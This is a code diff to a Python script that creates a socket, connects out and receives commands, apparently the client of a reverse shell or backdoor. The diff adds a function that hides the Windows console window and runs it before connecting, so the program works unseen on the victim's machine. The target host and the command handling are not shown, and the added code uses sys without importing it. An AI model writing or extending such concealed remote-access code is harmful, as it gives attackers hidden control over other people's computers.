@@ -1,7 +1,17 @@
 import os
 import socket
 import subprocess
+try:
+    import win32console, win32gui
+except ImportError:
+    print("Please install Pywin32")
+    sys.exit()
 
+# hide console window
+def hide():
+    window = win32console.GetConsoleWindow()
+    win32gui.ShowWindow(window, 0)
+    return True
 
 # Create a socket
 def socket_create():
@@ -44,6 +54,7 @@ def receive_commands():
 
 
 def main():
+    hide()
     socket_create()
     socket_connect()
     receive_commands()
